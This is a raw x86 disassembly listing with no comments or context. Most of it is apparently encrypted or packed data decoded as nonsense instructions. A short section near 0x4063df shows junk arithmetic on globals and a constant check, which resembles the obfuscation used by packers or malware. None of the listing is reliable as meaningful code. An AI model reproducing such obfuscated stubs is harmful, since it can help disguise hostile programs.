  40617b:	int    0xd1
  40617d:	enter  0xf5f4,0xe7
  406181:	aad    0xd5
  406183:	mov    ebx,0xb4bccbff
  406188:	fld    DWORD PTR [ebx]
  40618a:	mov    ecx,0xdec6d406
  40618f:	out    0xe9,eax
  406191:	(bad)  
  406192:	loopne 0x40617c
  406194:	or     eax,0xf90edcdb
  406199:	rol    ecx,0xcb
  40619c:	mov    ebp,0xceb0cfbc
  4061a1:	hlt    
  4061a2:	inc    edi
  4061a4:	mov    eax,0xe802dccd
  4061a9:	call   0xe613296a
  4061ae:	mov    DWORD PTR [eax],0x6f50ad0
  4061b4:	fld    DWORD PTR ds:0xacd8ee04
  4061ba:	lods   eax,DWORD PTR ds:[esi]
  4061bb:	lock mov cl,0xdc
  4061be:	xlat   BYTE PTR ds:[ebx]
  4061bf:	mov    ch,0xf7
  4061c1:	mov    edx,0xcccef4e0
  4061c6:	xlat   BYTE PTR ds:[ebx]
  4061c7:	mov    ecx,0xbdf5e9b8
  4061cc:	div    dh
  4061ce:	clc    
  4061cf:	ret    0xf6e5
  4061d2:	fild   DWORD PTR [eax]
  4061d4:	(bad)
  4061d7:	push   es
  4061d8:	bnd jmp 0xc51751ce
  4061de:	int    0xc7
  4061e0:	mov    bh,0xe9
  4061e2:	fcmovne st,st(1)
  4061e4:	lock shr ch,1
  4061e7:	in     al,dx
  4061e8:	hlt    
  4061e9:	leave  
  4061ea:	int    0xfc
  4061ec:	sti    
  4061ed:	neg    edx
  4061ef:	fsubr  st,st(1)
  4061f1:	shl    dl,1
  4061f3:	push   cs
  4061f4:	add    edi,esp
  4061f6:	(bad)
  4061f9:	retf   
  4061fa:	ret    0xd1b3
  4061fd:	retf   
  4061fe:	fdivr  st(4),st
  406200:	in     eax,dx
  406201:	iret   
  406202:	out    0xc4,eax
  406204:	int    0xce
  406206:	mov    ebx,0xd1bffef5
  40620b:	jecxz  0x40620d
  40620d:	aad    0xb
  40620f:	repnz out 0xd7,eax
  406212:	les    eax,FWORD PTR [ebx]
  406214:	mov    esp,0x6e0d4ec
  406219:	mov    edi,0xd7a8ecaa
  40621e:	mov    bh,0xd1
  406220:	out    0xcb,al
  406222:	icebp  
  406223:	call   0xf0fc1fe0
  406228:	ror    esi,1
  40622a:	out    dx,eax
  40622b:	pop    es
  40622c:	idiv   esp
  40622e:	mov    esp,0xcad6c0e7
  406233:	mov    ebp,0x120c0ee7
  406238:	loopne 0x4061f7
  40623a:	xlat   BYTE PTR ds:[ebx]
  40623b:	shl    ebx,0xd3
  40623e:	lds    esi,FWORD PTR [edi+ebp*8-0x3b361129]
  406245:	cld    
  406246:	call   0xd82f1f21
  40624b:	fcmovnbe st,st(3)
  40624d:	ret    
  40624e:	add    ah,dl
  406250:	add    dl,dh
  406252:	fild   DWORD PTR [ebx]
  406254:	fisttp DWORD PTR [edx]
  406256:	clc    
  406257:	int    0xd3
  406259:	loopne 0x40622e
  40625b:	fadd   st(2),st
  40625d:	mov    bh,0xda
  406260:	lock mov al,0xc5
  406263:	push   DWORD PTR [ebp+edi*4+0x1f1eaba]
  40626a:	sti    
  40626b:	xlat   BYTE PTR ds:[ebx]
  40626c:	loope  0x40626a
  40626e:	out    0xd2,eax
  406270:	loope  0x40624e
  406272:	(bad)  
  406273:	leave  
  406274:	loop   0x406244
  406276:	(bad)  
  406277:	fmul   DWORD PTR [esp+ebx*8]
  40627a:	out    dx,eax
  40627b:	in     eax,dx
  40627c:	loopne 0x40622a
  40627e:	in     eax,0xf6
  406280:	(bad)  
  406281:	mov    dh,0xff
  406283:	(bad)  
  406285:	(bad)  
  406286:	fdiv   st,st(6)
  406288:	repz out dx,al
  40628a:	enter  0xf4c0,0xff
  40628e:	in     eax,0xf8
  406290:	(bad)  
  406291:	imul   al
  406293:	mov    BYTE PTR [esi*8-0x57fd022c],0xa6
  40629b:	shr    BYTE PTR [eax-0x5172835],cl
  4062a1:	fcom   st(3)
  4062a3:	lods   eax,DWORD PTR ds:[esi]
  4062a4:	iret   
  4062a5:	ror    ah,1
  4062a7:	jecxz  0x40629c
  4062a9:	loop   0x4062ad
  4062ab:	mov    DWORD PTR [edi],0xf1c2dfdc
  4062b1:	cld    
  4062b2:	jmp    0xfcde:0xde03ddd9
  4062b9:	stos   BYTE PTR es:[edi],al
  4062ba:	loop   0x40628d
  4062bc:	out    dx,al
  4062bd:	jmp    0x4062a7
  4062bf:	(bad)  
  4062c0:	out    0xe8,eax
  4062c2:	into   
  4062c3:	mov    al,0xca
  4062c5:	fstp   st(5)
  4062c7:	ret    
  4062c8:	jecxz  0x40629f
  4062ca:	xlat   BYTE PTR ds:[ebx]
  4062cb:	out    0x1,al
  4062cd:	mov    ebp,0xfcbc0b04
  4062d2:	(bad)  
  4062d4:	hlt    
  4062d5:	ret    
  4062d6:	fxch   st(7)
  4062d8:	(bad)  
  4062d9:	mov    esi,0xd1d0c9be
  4062de:	lock retf 0xdac2
  4062e2:	mov    ah,0xff
  4062e4:	fucomp st(5)
  4062e6:	fcomp  st(7)
  4062e8:	ret    
  4062e9:	mov    edx,0xc005cee7
  4062ee:	(bad)  
  4062f0:	ret    
  4062f1:	retf   
  4062f2:	ret    0x7ea
  4062f5:	jecxz  0x406302
  4062f7:	or     al,0xe5
  4062f9:	test   al,0xe7
  4062fb:	scas   al,BYTE PTR es:[edi]
  4062fc:	lods   al,BYTE PTR ds:[esi]
  4062fd:	icebp  
  4062fe:	jecxz  0x4062f6
  406300:	rcl    dl,cl
  406302:	mov    edx,0xe8eed9c8
  406307:	jecxz  0x4062e7
  406309:	hlt    
  40630a:	shl    bh,0x5
  40630d:	ret    0xc7d1
  406310:	stc    
  406311:	jecxz  0x4062ec
  406313:	add    al,ch
  406315:	aad    0xa
  406317:	int3   
  406318:	add    eax,0xc6e4dee8
  40631d:	shr    DWORD PTR [esi-0xa071534],cl
  406323:	out    dx,al
  406324:	leave  
  406325:	in     eax,dx
  406326:	int    0xb9
  406328:	in     eax,dx
  406329:	add    cl,al
  40632b:	clc    
  40632c:	repnz fadd QWORD PTR [ecx]
  40632f:	fucomp st(3)
  406331:	ret    
  406332:	out    0xc8,eax
  406334:	fxch   st(2)
  406336:	(bad)  
  406339:	loopne 0x406300
  40633b:	mov    esp,0xecc4cdb6
  406340:	test   al,0xca
  406342:	repz fucomip st,st(4)
  406345:	rcr    esi,cl
  406347:	rcl    ebx,1
  406349:	loope  0x40634a
  40634b:	fadd   QWORD PTR [esi]
  40634d:	(bad)  
  40634e:	jecxz  0x40634d
  406350:	(bad)  
  406352:	hlt    
  406353:	out    dx,al
  406354:	jmp    0xf434257
  406359:	retf   
  40635a:	jmp    0x40630a
  40635c:	(bad)  
  40635d:	aad    0xf6
  40635f:	(bad)  
  406360:	mov    edx,0xb5fee9c9
  406365:	fdivr  st,st(4)
  406367:	aam    0xf7
  406369:	enter  0xb5f3,0xe6
  40636d:	rcr    al,cl
  40636f:	cmc    
  406370:	retf   0xd0d5
  406373:	fcmovu st,st(3)
  406375:	ret    
  406376:	jmp    0x406372
  406378:	int3   
  406379:	mov    ecx,0xebc4c4c2
  40637e:	lods   al,BYTE PTR ds:[esi]
  40637f:	mul    esp
  406381:	(bad)  
  406382:	repnz mov eax,0xecfbe5de
  406388:	int3   
  406389:	rcr    bl,1
  40638b:	ret    0x7b4
  40638e:	add    esi,ebx
  406390:	mov    esp,0x6f8feea
  406395:	ret    
  406396:	std    
  406397:	or     bl,dh
  406399:	iret   
  40639a:	out    0xf1,al
  40639c:	call   0xcb054b67
  4063a1:	scas   eax,DWORD PTR es:[edi]
  4063a2:	in     eax,0xed
  4063a4:	mov    edx,0xfbdddad8
  4063a9:	mov    ebp,0xcc02f1d7
  4063ae:	mov    DWORD PTR [edx+ebx*8],0xd903f5fb
  4063b5:	aad    0xd8
  4063b7:	or     cl,dh
  4063b9:	mov    cl,0xcc
  4063bb:	retf   
  4063bc:	ret    
  4063bd:	loopne 0x4063a0
  4063bf:	icebp  
  4063c0:	mov    ah,0xe1
  4063c2:	shl    ebp,cl
  4063c4:	jmp    0xe1bc:0xcdfad1b3
  4063cb:	inc    BYTE PTR [eax]
  4063cd:	ffreep st(4)
  4063cf:	hlt    
  4063d0:	jmp    0x40639b
  4063d2:	loopne 0x4063d1
  4063d4:	cld    
  4063d5:	loope  0x40639b
  4063d7:	(bad)  
  4063d9:	(bad)  [ebp+0x5650ec83]
  4063df:	mov    DWORD PTR [ebp-0x4],0x437423
  4063e6:	dec    DWORD PTR ds:0x43771f
  4063ec:	mov    DWORD PTR [ebp-0x8],0x43742b
  4063f3:	or     DWORD PTR ds:0x437767,0x43777f
  4063fd:	lea    eax,[ebp-0x18]
  406400:	inc    DWORD PTR ds:0x4377a3
  406406:	mov    DWORD PTR [ebp-0xc],eax
  406409:	dec    DWORD PTR ds:0x43772b
  40640f:	mov    eax,DWORD PTR [ebp-0xc]
  406412:	mov    DWORD PTR [eax],0x70941f82
  406418:	mov    DWORD PTR [eax+0x4],0xffffffff
  40641f:	sub    eax,DWORD PTR ds:0x43770f
  406425:	mov    eax,ds:0x43739f
  40642a:	inc    DWORD PTR ds:0x43775b
  406430:	mov    eax,DWORD PTR [eax+0x1c0]
  406436:	or     DWORD PTR ds:0x4377ab,0x72ba
  406440:	mov    eax,DWORD PTR [eax]
  406442:	sub    DWORD PTR ds:0x437763,0x437723
  40644c:	xor    ecx,ecx
  40644e:	sbb    DWORD PTR ds:0x43779f,0x733b
  406458:	sub    eax,0x5424137
  40645d:	mov    DWORD PTR ds:0x4377a3,0x54e3
  406467:	sbb    ecx,0x0
  40646a:	xor    eax,0x8a29a14b
  40646f:	xor    ecx,0x0
  406472:	mov    DWORD PTR ds:0x43779f,0x3ce1
  40647c:	mov    DWORD PTR [ebp-0x20],eax
  40647f:	mov    DWORD PTR [ebp-0x1c],ecx
  406482:	mov    DWORD PTR ds:0x43777f,0x5274
  40648c:	cmp    DWORD PTR [ebp-0x20],0x70941f81
  406493:	jne    0x4089fc
  406499:	mov    DWORD PTR ds:0x437743,0x6c71
  4064a3:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  4064a7:	jne    0x4089fc
  4064ad:	sbb    DWORD PTR ds:0x43778b,edx
  4064b3:	mov    eax,DWORD PTR [ebp-0x8]
  4064b6:	and    DWORD PTR ds:0x437753,0x437727
  4064c0:	mov    eax,DWORD PTR [eax]
  4064c2:	xor    ecx,ecx
  4064c4:	sub    eax,0x5424137
  4064c9:	jmp    0x408817
  4064ce:	mov    ds:0xf452acdf,al
  4064d3:	push   eax
  4064d4:	outs   dx,DWORD PTR fs:[esi]
  4064d6:	jbe    0x406527
  4064d8:	loope  0x406479
  4064da:	sbb    al,ah
  4064dc:	mov    ah,0xd9
  4064df:	mov    ebp,0x98aa7b7b
  4064e4:	jnp    0x406561
  4064e6:	shl    esi,1
  4064e8:	out    dx,eax
  4064e9:	out    0xf4,al
  4064eb:	mov    edx,0xd9edead8
  4064f0:	cli    
  4064f1:	idiv   bl
  4064f3:	sar    BYTE PTR [ebp+ecx*8+0x6e500f2],1
  4064fa:	(bad)  
  4064fb:	jmp    0xef0c:0x7d7dbe3
  406502:	jmp    0xc5194bf1
  406507:	out    0xcd,al
  406509:	div    esi
  40650b:	iret   
  40650c:	fcom   st(5)
  40650e:	fdivrp st(4),st
  406510:	mov    ch,0xbe
  406512:	retf   0xfbfb
  406515:	mov    dh,0xd8
  406517:	int3   
  406518:	loop   0x4064f4
  40651a:	test   ah,0xfd
  40651d:	test   esp,0xd3c408d8
  406523:	std    
  406524:	out    dx,eax
  406525:	mov    bl,0xdc
  406527:	ret    
  406528:	jmp    0xc4eb:0xb7ace0e0
  40652f:	std    
  406530:	mov    ecx,0xc3eaecf1
  406535:	cli    
  406536:	fcmovne st,st(4)
  406538:	lock fcmovb st,st(4)
  40653b:	mov    eax,0x5c5e5d6
  406540:	or     dl,bh
  406542:	push   edx
  406544:	rcr    eax,1
  406546:	jmp    0x406519
  406548:	out    dx,eax
  406549:	fld    TBYTE PTR [ebp-0x180a353e]
  40654f:	mov    esi,0xffc8d9da
  406554:	aad    0xf5
  406556:	mov    ebp,0xf2c5f7e1
  40655b:	(bad)
  40655e:	fucomi st,st(0)
  406560:	call   0xe0136f4f
  406565:	out    0xe9,eax
  406567:	fsub   st(5),st
  406569:	loop   0x406561
  40656b:	cli    
  40656c:	jmp    0x40655e
  40656e:	out    dx,eax
  40656f:	out    dx,eax
  406570:	mov    ecx,0xe9fbd5fe
  406575:	out    dx,al
  406576:	mov    esi,0xd3f0bed1
  40657b:	clc    
  40657c:	out    0x9,eax
  40657e:	jmp    0xd1e9:0x9fdcecf
  406585:	rol    eax,0xf0
  406588:	out    dx,eax
  406589:	in     eax,0xc1
  40658b:	(bad)
  40658e:	in     al,0xe5
  406590:	icebp  
  406591:	jmp    0xeffa1f63
  406596:	fabs   
  406598:	add    eax,0x9fddfd8
  40659d:	cld    
  40659e:	or     dl,ah
  4065a0:	or     ebp,ebp
  4065a2:	std    
  4065a3:	fnstcw WORD PTR [ebp-0xc193916]
  4065a9:	rcr    edx,cl
  4065ab:	mul    ecx
  4065ad:	leave  
  4065ae:	(bad)  
  4065af:	lock aam 0x3
  4065b2:	call   0xcd3f3db2
  4065b7:	rol    ebp,cl
  4065b9:	(bad)  
  4065bb:	out    0xd9,eax
  4065bd:	les    eax,FWORD PTR [esi]
  4065bf:	loop   0x4065b6
  4065c1:	fcos   
  4065c3:	repz mov bl,0xea
  4065c6:	fild   QWORD PTR [ecx+esi*8-0xd2c2519]
  4065cd:	loopne 0x406593
  4065cf:	mov    ecx,0xfcb9ecbd
  4065d4:	icebp  
  4065d5:	in     eax,dx
  4065d6:	into   
  4065d7:	ret    0xd5cc
  4065da:	sar    ah,0xf0
  4065dd:	cld    
  4065de:	mul    al
  4065e0:	loope  0x4065e5
  4065e2:	(bad)  
  4065e4:	(bad)  
  4065e6:	int    0xa8
  4065e8:	loopne 0x406598
  4065ea:	icebp  
  4065eb:	loope  0x4065a6
  4065ed:	idiv   ecx
  4065ef:	leave  
  4065f0:	int3   
  4065f1:	fcmovnu st,st(0)
  4065f3:	mov    esi,0xfa07ffe2
  4065f8:	(bad)  
  4065fa:	ffree  st(1)
  4065fc:	ror    DWORD PTR [edi],0xe9
  4065ff:	jecxz  0x4065f5
  406601:	or     cl,ch
  406603:	stc    
  406604:	rol    edx,cl
  406606:	int    0xd7
  406608:	jmp    0x4065ba
  40660a:	(bad)  
  40660b:	(bad)  
  40660c:	in     eax,dx
  40660d:	lock (bad) 
  40660f:	in     al,0xca
  406611:	mov    dh,0xed
  406613:	in     al,dx
  406614:	fstp   st(3)
  406616:	shr    dh,1
  406618:	(bad)  
  40661a:	idiv   al
  40661c:	or     DWORD PTR [eax],ecx
  40661e:	iret   
  40661f:	into   
  406620:	jmp    0xbd3444fe
  406625:	loope  0x406615
  406627:	scas   al,BYTE PTR es:[edi]
  406628:	in     eax,0xcf
  40662a:	repnz rol dh,0xea
  40662e:	mov    cl,0xcd
  406630:	fxch   st(5)
  406632:	(bad)  
  406633:	xlat   BYTE PTR ds:[ebx]
  406634:	mov    edx,0x3b4f6d0
  406639:	mov    esi,0xdac303dc
  40663e:	(bad)  
  40663f:	std    
  406640:	ret    
  406641:	pop    es
  406642:	iret   
  406643:	psubsb mm5,QWORD PTR [eax-0xd0c220a]
  40664a:	loopne 0x406620
  40664c:	mov    cl,0xd4
  40664e:	out    dx,eax
  40664f:	mov    dh,0xdd
  406651:	fscale 
  406653:	mov    esi,0xf7f301f0
  406658:	shl    ebp,0xfa
  40665b:	(bad)  
  40665c:	fcomp  st(2)
  40665e:	out    dx,al
  40665f:	retf   0x10a
  406662:	add    eax,ebp
  406664:	out    dx,al
  406665:	ror    al,cl
  406667:	loope  0x40665b
  406669:	mov    ah,0xcd
  40666b:	cmc    
  40666c:	sti    
  40666d:	into   
  40666e:	mov    ch,0xd4
  406670:	fnstcw WORD PTR [ebx+0x2bacfec]
  406676:	imul   esi
  406678:	sar    dh,cl
  40667a:	push   es
  40667b:	test   DWORD PTR [ecx],0xfedce9df
  406681:	retf   
  406682:	fadd   st,st(4)
  406684:	lock mov esi,0xe6d4b0ce
  40668a:	in     al,0xe5
  40668c:	icebp  
  40668d:	repz cli 
  40668f:	lock mov ecx,0xedbcf2ea
  406695:	mov    eax,0xd8c3e5e6
  40669a:	fdivr  st(0),st
  40669c:	retf   
  40669d:	add    ebp,esp
  40669f:	(bad)  
  4066a0:	cld    
  4066a1:	loop   0x4066ac
  4066a3:	loop   0x40664d
  4066a5:	(bad)  
  4066a6:	out    dx,al
  4066a7:	mov    cl,0xed
  4066a9:	call   0xd6f117a9
  4066ae:	repz sti 
  4066b0:	clc    
  4066b1:	ror    esp,1
  4066b3:	cmc    
  4066b4:	ret    0xd0e2
  4066b7:	add    esp,ebp
  4066b9:	shl    ah,cl
  4066bb:	shl    al,cl
  4066bd:	(bad)  [edi]
  4066bf:	fcomp  st(1)
  4066c1:	out    dx,eax
  4066c2:	add    eax,eax
  4066c4:	shl    al,0xbc
  4066c7:	imul   BYTE PTR [ebx+eax*8-0xf49250b]
  4066ce:	jmp    0xddec:0xbcefd8eb
  4066d5:	rcl    ebp,0xc2
  4066d8:	clc    
  4066d9:	fadd   st,st(7)
  4066db:	xlat   BYTE PTR ds:[ebx]
  4066dc:	rol    bh,0xca
  4066df:	(bad)  
  4066e1:	jecxz  0x4066ec
  4066e3:	adc    esi,esp
  4066e5:	ret    0xeae4
  4066e8:	out    0xe7,al
  4066ea:	aad    0xca
  4066ec:	sti    
  4066ed:	jmp    0x4066c1
  4066ef:	xlat   BYTE PTR ds:[ebx]
  4066f0:	fdiv   st(5),st
  4066f2:	hlt    
  4066f3:	std    
  4066f4:	mov    ecx,0xd8e202d1
  4066f9:	ret    0xf6dd
  4066fc:	pop    es
  4066fd:	cmc    
  4066fe:	shl    edi,0x8
  406701:	sti    
  406702:	or     eax,0xcdb1edcb
  406707:	jecxz  0x4066ee
  406709:	(bad)
  40670c:	mov    bl,0xae
  40670e:	mov    edx,0xeff3f6e6
  406713:	ret    
  406714:	mov    bh,0xd8
  406716:	std    
  406717:	out    dx,al
  406718:	hlt    
  406719:	in     eax,0xf3
  40671b:	stc    
  40671c:	sar    dh,0xe7
  40671f:	or     esp,edi
  406721:	fucomip st,st(1)
  406723:	int    0xe5
  406725:	mov    eax,0xdbeadcf0
  40672a:	ret    
  40672b:	jmp    0xc8c4:0xeaeaaece
  406732:	loop   0x406725
  406734:	add    dl,dl
  406736:	fadd   st,st(2)
  406738:	(bad)  
  40673a:	test   DWORD PTR [ebx],0xeffdc5e8
  406740:	or     BYTE PTR [eax],cl
  406742:	cli    
  406743:	or     ah,dh
  406745:	out    0xbf,eax
  406747:	jecxz  0x406715
  406749:	cmc    
  40674a:	iret   
  40674b:	aad    0xe0
  40674d:	fidiv  DWORD PTR [ecx-0x44232934]
  406753:	int3   
  406754:	mov    ebx,0xcdf9fbf0
  406759:	cmc    
  40675a:	cmc    
  40675b:	(bad)  
  40675d:	(bad)  
  40675e:	std    
  40675f:	cli    
  406760:	jmp    0xe93a415f
  406765:	out    dx,al
  406766:	lods   eax,DWORD PTR ds:[esi]
  406767:	(bad)
  40676a:	lods   al,BYTE PTR ds:[esi]
  40676b:	in     al,0xfb
  40676d:	repnz mov dh,0xe5
  406770:	in     eax,0xb2
  406772:	jmp    0x406748
  406774:	mov    edi,0xfcd0bcf9
  406779:	mov    BYTE PTR [edi],0xff
  40677c:	aad    0x3
  40677e:	mov    ebp,0xffffe6ed
  406783:	out    0xc7,al
  406785:	sar    DWORD PTR [esi-0x252d4f37],cl
  40678b:	shl    edx,0xe9
  40678e:	mov    ebx,0xdcc4e8cf
  406793:	inc    BYTE PTR [ebx]
  406795:	rol    BYTE PTR [edx],1
  406797:	fcmovnb st,st(0)
  406799:	loopne 0x40677b
  40679b:	rcl    ah,1
  40679d:	ror    DWORD PTR [edi],0xe5
  4067a0:	(bad)  
  4067a1:	iret   
  4067a2:	jecxz  0x4067b1
  4067a4:	(bad)  
  4067a5:	out    dx,al
  4067a6:	test   eax,0xb6ead6d0
  4067ab:	jmp    0xfb084e84
  4067b0:	(bad)  
  4067b2:	loop   0x406764
  4067b4:	cmc    
  4067b5:	mov    edx,0xf9f1ee06
  4067ba:	add    al,0xe5
  4067bc:	or     ebp,ebx
  4067be:	aad    0xe3
  4067c0:	call   0xed4f438f
  4067c5:	in     al,dx
  4067c6:	leave  
  4067c7:	loope  0x4067a5
  4067c9:	repnz icebp 
  4067cb:	(bad)  
  4067cc:	mov    dl,0xae
  4067ce:	shl    edi,cl
  4067d0:	mov    edi,0xc203d2e3
  4067d5:	shl    esi,cl
  4067d7:	add    esp,edx
  4067d9:	cld    
  4067da:	retf   
  4067db:	add    al,ah
  4067dd:	lock rol eax,0xf
  4067e1:	(bad)  
  4067e2:	in     eax,0x4
  4067e4:	in     eax,0xeb
  4067e6:	jmp    0x4067ca
  4067e8:	cmc    
  4067e9:	mov    dh,0xb1
  4067eb:	sar    DWORD PTR [edx-0x13153330],0xbe
  4067f2:	(bad)  
  4067f4:	repnz add bh,BYTE PTR [esi-0x2c030123]
  4067fb:	sti    
  4067fc:	hlt    
  4067fd:	add    edi,esi
  4067ff:	sti    
  406800:	pop    es
  406801:	or     al,0xee
  406803:	add    ebp,ebp
  406805:	int3   
  406806:	mov    esp,0xc0e5eeec
  40680b:	mov    dh,0xba
  40680d:	mov    eax,0xbdb5f2ea
  406812:	dec    edx
  406814:	fucomi st,st(0)
  406816:	add    ebp,ebx
  406818:	jecxz  0x4067ed
  40681a:	push   es
  40681b:	out    0xc6,eax
  40681d:	std    
  40681e:	std    
  40681f:	std    
  406820:	aad    0xc8
  406822:	iret   
  406823:	pop    es
  406824:	ffreep st(3)
  406826:	leave  
  406827:	mov    cl,0xc2
  406829:	loopne 0x4067e6
  40682b:	shl    ebx,0xd6
  40682e:	mov    edi,0xbbefb9d2
  406833:	mov    edi,0xe6c3fdc2
  406838:	(bad)  
  40683b:	(bad)
  40683e:	aad    0xe0
  406840:	leave  
  406841:	pop    es
  406842:	leave  
  406843:	in     eax,0xc8
  406845:	test   eax,0xd6d1e8e8
  40684a:	loop   0x406822
  40684c:	sar    bl,cl
  40684e:	cmc    
  40684f:	(bad)  
  406850:	mov    dh,0xe9
  406852:	(bad)  
  406853:	mov    ebx,0xf5d2dcef
  406858:	loop   0x406853
  40685a:	out    0xf7,al
  40685c:	hlt    
  40685d:	(bad)
  406860:	bswap  edx
  406862:	in     eax,dx
  406863:	loopne 0x40682f
  406865:	mov    esi,0xdce4e9cb
  40686a:	mov    dl,0xe4
  40686c:	rcr    al,0xcb
  40686f:	jmp    0xf6365a2f
  406874:	hlt    
  406875:	repnz in al,dx
  406877:	sar    DWORD PTR [eax+esi*8-0x37280d0e],1
  40687e:	les    ecx,FWORD PTR [ebx]
  406880:	lsl    ebp,ax
  406883:	or     edx,ecx
  406885:	mov    ebp,0xdccec3ea
  40688a:	mov    dh,0xd7
  40688c:	aam    0xcb
  40688e:	into   
  40688f:	clc    
  406890:	std    
  406891:	mov    ebx,0x3e8b4ee
  406896:	fld    QWORD PTR [edi]
  406898:	jecxz  0x406895
  40689a:	jmp    0xc5df:0xb05fdd2
  4068a1:	stc    
  4068a2:	std    
  4068a3:	f2xm1  
  4068a5:	into   
  4068a6:	in     al,dx
  4068a7:	lods   al,BYTE PTR ds:[esi]
  4068a8:	retf   
  4068a9:	mov    dl,0xea
  4068ab:	(bad)  
  4068ac:	mov    ecx,0xb3f0c7e5
  4068b1:	rcr    edi,cl
  4068b3:	mov    ebp,0xeebfedc2
  4068b8:	int3   
  4068b9:	lock rcr cl,1
  4068bc:	or     ah,bh
  4068be:	(bad)  
  4068bf:	or     BYTE PTR [edx],cl
  4068c1:	adc    eax,DWORD PTR ds:0xdedec1df
  4068c7:	test   al,0xce
  4068c9:	(bad)  
  4068ca:	mov    bl,0xfb
  4068cc:	iret   
  4068cd:	loopne 0x4068c0
  4068cf:	call   0xed1b46ad
  4068d4:	loope  0x4068b8
  4068d6:	fcomp  st(2)
  4068d8:	jecxz  0x4068ae
  4068da:	(bad)  
  4068db:	jmp    0xbd8:0xefeedbe6
  4068e2:	out    dx,al
  4068e3:	or     ecx,esi
  4068e5:	scas   eax,DWORD PTR es:[edi]
  4068e6:	in     al,dx
  4068e7:	mov    ebp,0xe6cbd4c8
  4068ec:	sar    cl,0xb1
  4068ef:	lock in al,0xf0
  4068f2:	mov    ah,0xea
  4068f4:	fcmovbe st,st(3)
  4068f6:	mov    esp,0xc3c3bdc7
  4068fb:	loope  0x4068cd
  4068fd:	jmp    0xed252efd
  406902:	or     esp,esi
  406904:	mov    bl,0xc0
  406906:	scas   al,BYTE PTR es:[edi]
  406907:	mov    cl,0xd6
  406909:	repz not ch
  40690c:	(bad)
  40690f:	fcmovne st,st(6)
  406911:	mov    dh,0xba
  406913:	repz mov eax,0x5e7e3ef
  406919:	add    eax,0xe5cade07
  40691e:	jmp    0x4068f8
  406920:	fstp   st(2)
  406922:	fcom   st(3)
  406924:	(bad)  
  406925:	imul   ecx
  406927:	ret    0xb5b2
  40692a:	ror    edx,cl
  40692c:	clc    
  40692d:	out    dx,eax
  40692e:	out    0xed,al
  406930:	div    DWORD PTR [ebp+edi*4-0x25261227]
  406937:	rcl    edi,cl
  406939:	out    0x4,al
  40693b:	add    dh,al
  40693d:	fiadd  WORD PTR [eax]
  40693f:	fmul   DWORD PTR [eax]
  406941:	fld    QWORD PTR [eax]
  406943:	repz retf 
  406945:	shr    dh,0xa8
  406948:	(bad)  
  406949:	shr    ecx,cl
  40694b:	xlat   BYTE PTR ds:[ebx]
  40694c:	shr    dl,1
  40694e:	call   0xb5fc5644
  406953:	imul   esp
  406955:	add    eax,edi
  406957:	out    0xda,al
  406959:	std    
  40695a:	aam    0xea
  40695c:	std    
  40695d:	out    0xf9,eax
  40695f:	fadd   DWORD PTR ds:0xefd3ffd8
  406965:	lods   eax,DWORD PTR ds:[esi]
  406966:	shl    BYTE PTR [ebx-0xa36350c],cl
  40696c:	icebp  
  40696d:	out    0xba,al
  40696f:	dec    al
  406971:	leave  
  406972:	mov    ecx,0xbdbf00d1
  406977:	std    
  406978:	(bad)  
  406979:	fstp   st(3)
  40697b:	(bad)  
  40697c:	xlat   BYTE PTR ds:[ebx]
  40697d:	add    eax,0xcaddfffc
  406982:	int    0xef
  406984:	stos   BYTE PTR es:[edi],al
  406985:	ret    0xcbe7
  406988:	hlt    
  406989:	sar    bl,cl
  40698b:	cli    
  40698c:	stc    
  40698d:	icebp  
  40698e:	idiv   BYTE PTR [ecx-0x41373021]
  406994:	ret    0x3e8
  406997:	ret    
  406998:	loope  0x406971
  40699a:	(bad)  
  40699b:	fcomip st,st(7)
  40699d:	aad    0xe3
  40699f:	pop    es
  4069a0:	out    0xde,eax
  4069a2:	in     al,dx
  4069a3:	push   cs
  4069a4:	loop   0x40696a
  4069a6:	jmp    0xdbd0:0xb0b7e7b0
  4069ad:	out    0xc8,eax
  4069af:	(bad)  
  4069b1:	retf   0xfeda
  4069b4:	out    dx,eax
  4069b5:	mov    edi,0xbdfcf500
  4069ba:	fadd   QWORD PTR [ebx]
  4069bc:	ror    eax,1
  4069be:	jmp    0xff483fa9
  4069c3:	(bad)  
  4069c4:	rol    bh,1
  4069c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069c7:	out    0xb5,al
  4069c9:	(bad)  
  4069ca:	shl    BYTE PTR [esi-0x20241227],cl
  4069d0:	aam    0xcb
  4069d2:	add    esi,edx
  4069d4:	add    bh,bl
  4069d6:	int3   
  4069d7:	mov    ah,0xd3
  4069d9:	fdivrp st(1),st
  4069db:	cmc    
  4069dc:	(bad)
  4069df:	mul    ah
  4069e1:	int3   
  4069e2:	add    al,bl
  4069e4:	ror    al,cl
  4069e6:	mov    bh,0xde
  4069e8:	retf   0xd0c2
  4069eb:	out    dx,eax
  4069ec:	xlat   BYTE PTR ds:[ebx]
  4069ed:	retf   0xb9bb
  4069f0:	call   0x3c46a9
  4069f5:	(bad)  
  4069f7:	(bad)  
  4069f8:	aam    0x4
  4069fa:	(bad)
  4069fd:	loop   0x4069c7
  4069ff:	ror    BYTE PTR [ebx],0xee
  406a02:	lmsw   WORD PTR [ebx-0x1411213c]
  406a09:	(bad)  
  406a0a:	shr    edx,1
  406a0c:	hlt    
  406a0d:	jmp    0xe92e56f7
  406a12:	call   0xd32337ef
  406a17:	out    dx,al
  406a18:	ret    
  406a19:	loope  0x4069fe
  406a1b:	clc    
  406a1c:	fnstcw WORD PTR [esi+0xbcee708]
  406a22:	repz in al,0xb8
  406a25:	mov    bl,0xc9
  406a27:	shl    ecx,1
  406a29:	in     eax,dx
  406a2a:	icebp  
  406a2b:	in     al,dx
  406a2c:	rcl    bh,0xfb
  406a2f:	mov    ah,0xfd
  406a31:	mov    dl,0xd7
  406a33:	mov    esi,0xf2d0fe
  406a38:	loope  0x406a3a
  406a3a:	aad    0x3
  406a3c:	add    ebx,ecx
  406a3e:	hlt    
  406a3f:	fcmovnb st,st(5)
  406a41:	or     ebx,edx
  406a43:	add    eax,0xc2e3c5b3
  406a48:	out    0xd3,eax
  406a4a:	jmp    0x406a46
  406a4c:	sti    
  406a4d:	not    eax
  406a4f:	icebp  
  406a50:	leave  
  406a51:	call   0x2325a11
  406a56:	rcr    edi,cl
  406a58:	(bad)  
  406a59:	add    esp,esp
  406a5b:	cld    
  406a5c:	(bad)  [ebx]
  406a5e:	(bad)  
  406a60:	jmp    0xb3f1:0xbe0403f3
  406a67:	loope  0x406a1b
  406a69:	imul   ebx
  406a6b:	leave  
  406a6c:	in     eax,0xb2
